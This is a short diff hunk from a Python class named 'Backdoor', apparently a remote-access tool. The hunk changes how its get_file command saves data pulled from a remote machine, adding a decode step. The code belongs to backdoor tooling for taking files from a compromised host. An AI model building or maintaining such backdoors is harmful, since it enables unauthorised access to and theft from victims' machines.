@@ -157,7 +157,7 @@ class Backdoor:
             print("Downloads a remote file and saves it to your local computer \nsyntax: get_file <remote_path> <local_path>\nPlease use absolute paths!")
             return False
         data = self.recvall(connection)
-        if save_content_to_file(data, file_location):
+        if save_content_to_file(data.decode(), file_location):
             self.print_verbose_message(f"Saved content {len(data)} to {file_location}")
         return True
 
